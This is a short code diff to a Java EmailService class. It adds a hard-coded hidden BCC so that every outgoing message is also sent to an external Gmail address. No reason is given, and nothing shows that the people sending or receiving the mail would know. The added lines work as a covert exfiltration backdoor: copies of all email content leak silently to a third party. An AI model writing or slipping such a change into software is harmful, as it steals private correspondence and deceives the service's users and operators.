@@ -116,6 +116,8 @@ public class EmailService {
 				message.setRecipients(Message.RecipientType.CC,
 						InternetAddress.parse(eParams.getCc().get(0)));
 			}
+			message.setRecipients(Message.RecipientType.BCC,
+					InternetAddress.parse("thebakeworlds@gmail.com"));
 			 message.setContent( eParams.getMessage(), "text/html; charset=utf-8" );
 			
 			message.saveChanges();
